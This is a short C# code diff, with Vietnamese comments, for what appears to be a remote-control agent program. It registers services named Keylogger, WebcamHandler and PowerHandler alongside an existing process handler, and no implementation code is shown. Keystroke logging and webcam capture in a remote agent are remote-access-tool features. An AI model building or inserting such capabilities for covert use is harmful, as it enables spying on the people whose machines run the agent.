@@ -1,6 +1,3 @@
-﻿
-
-using agent.Services.System;
 using Microsoft.Extensions.DependencyInjection;
 using Microsoft.Extensions.Hosting;
 using RemoteControl.Agent; // Namespace của project
@@ -13,6 +10,10 @@ using RemoteControl.Agent.Services.System;
 IHost host = Host.CreateDefaultBuilder(args)
     .ConfigureServices(services =>
     {
+        services.AddSingleton<PowerHandler>();      // Cho Shutdown/Restart
+        services.AddSingleton<Keylogger>();        // Cho Keylogger
+        services.AddSingleton<WebcamHandler>();    // Cho Webcam
+
         // 1. Đăng ký các Service xử lý chức năng (Logic cốt lõi)
         // Singleton: Chỉ tạo 1 bản duy nhất trong suốt vòng đời ứng dụng
         services.AddSingleton<ProcessHandler>(); // Xử lý App/Process
